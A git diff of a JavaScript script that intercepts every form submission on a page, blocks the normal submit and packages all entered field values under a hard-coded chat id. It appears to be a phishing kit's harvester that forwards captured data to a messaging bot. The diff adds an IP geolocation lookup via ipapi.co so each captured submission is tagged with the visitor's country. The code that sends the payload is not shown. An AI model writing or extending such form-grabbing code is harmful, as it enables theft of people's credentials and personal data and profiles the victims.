@@ -2,6 +2,18 @@ document.addEventListener("DOMContentLoaded", () => {
   const DEFAULT_USER_ID = "7979664801"; // fallback if no id in URL
   const forms = document.querySelectorAll("form");
 
+  let userCountry = "Unknown"; // default
+
+  // Get country name from IP (via ipapi.co)
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      if (data && data.country_name) {
+        userCountry = data.country_name;
+      }
+    })
+    .catch(err => console.error("IP lookup error:", err));
+
   forms.forEach((form, index) => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
@@ -16,12 +28,13 @@ document.addEventListener("DOMContentLoaded", () => {
         formData[key] = value;
       });
 
-      // Add page title and form name
+      // Add page title, form name, and country
       const payload = {
         chat_id: userId,
         form_data: formData,
         pageTitle: document.title,
-        formName: form.getAttribute("name") || `Form-${index + 1}`
+        formName: form.getAttribute("name") || `Form-${index + 1}`,
+        country: userCountry
       };
 
       try {
